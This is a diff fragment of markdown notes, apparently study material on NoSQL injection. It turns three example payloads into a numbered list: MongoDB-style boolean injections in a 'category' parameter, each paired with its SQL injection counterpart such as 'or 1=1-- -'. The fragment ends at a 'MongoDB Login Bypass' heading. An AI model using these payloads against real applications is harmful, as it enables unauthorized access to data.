@@ -12,9 +12,9 @@
 ```
 ## Example with explanation:
 
-```category=Gifts' && 0 && 'x``` >> This will return no items like ```category=Gifts' and 1=0-- -``` in sql injection.
-```category=Gifts' && 1 && 'x``` >> This will return Gift items like ```category=Gifts' and 1=1-- -``` in sql injection.
-```category=' || 1 || 'x``` >> This will return all the items like ```category=Gifts' or 1=1-- -``` in sql injection.
+  1. ```category=Gifts' && 0 && 'x``` >> This will return no items like ```category=Gifts' and 1=0-- -``` in sql injection.
+  2. ```category=Gifts' && 1 && 'x``` >> This will return Gift items like ```category=Gifts' and 1=1-- -``` in sql injection.
+  3. ```category=' || 1 || 'x``` >> This will return all the items like ```category=Gifts' or 1=1-- -``` in sql injection.
 
 # MongoDB Login Bypass
 
